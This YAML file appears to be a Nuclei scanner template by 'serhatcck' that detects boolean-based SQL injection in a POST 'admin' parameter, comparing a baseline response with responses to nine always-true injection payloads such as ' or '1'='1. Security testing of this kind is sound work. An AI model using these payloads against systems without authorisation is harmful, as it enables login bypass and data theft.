id: sqli-boolean-based-post

info:
  name: Boolean Based SQL Injection (POST)
  author: serhatcck
  severity: critical
  description: Boolean Based SQLi via POST parameter 'admin'
  tags: sqli, dast

flow: http(1) && http(2)

http:
  - method: POST
    path: 
      - "{{BaseURL}}"
   
    body: "admin={{empty}}"

    payloads:
      empty:
        - ""

    matchers:
      - type: dsl
        dsl: 
          - 'status_code == 200'
        internal: true 

  - method: POST
    path: 
      - "{{BaseURL}}"
   
    body: "admin={{injection}}"

    payloads:
      injection:
        - "' or '123'='123"
        - " or 123 = 123"
        - "' and '123'='123"
        - "\" or \"123\"=\"123\""
        - "\" and \"123\"=\"123\""
        - " or 1=1 -- -"
        - " or 1=1; -- -"
        - "and 1=1; -- -"
        - "' or '1'='1' #"

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl: 
          - '(len(http_2_body) + len(injection)) > len(http_1_body)'
